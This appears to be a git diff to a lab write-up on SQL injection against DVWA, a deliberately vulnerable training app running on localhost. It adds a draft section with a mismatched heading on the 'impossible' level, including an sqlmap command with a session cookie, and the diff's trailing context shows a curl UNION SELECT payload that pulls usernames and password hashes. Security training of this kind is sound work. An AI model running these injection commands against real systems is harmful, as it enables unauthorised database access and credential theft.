@@ -281,6 +281,31 @@ Prerequisites are
 
 - Crack **Hash** to get password
 
+---
+
+# SQL Injection on DVWA Medium Security
+
+- Step 1: Prepation
+  Set DVWA Security level to **IMPOSSIBLE** and navigate to **SQL Injection**
+
+(image=impossible)
+
+
+- Step 2: Access backend code
+  `sudo nano /var/www/html/DVWA/vulnerabilities/sqli/source/impossible.php`
+(Image)
+  OR
+  Click the **View Source** tab at the bottom of the page
+  (image)
+
+  The input is bound as an interger as a key protection `**PDO::PARAM_INT**`. From this we know the page prevents an SQL injection.
+  
+- Lets Test with **SQLMAP**
+- 
+  Using this command `explain what method we are using here "sqlmap --level=5 --risk=3 --flush-session -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1" --cookie="PHPSESSID=vnqgiaravme1q5j1daaiv73g24; security=impossible""`
+
+  This command performs an automated SQL injection testing against DVWA's impossible-level security.
+
 curl -s -G \
 --cookie "PHPSESSID=kemqe0e3qhltqdddoelp0ssv1i; security=high" \
 "http://localhost/DVWA/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- -" \
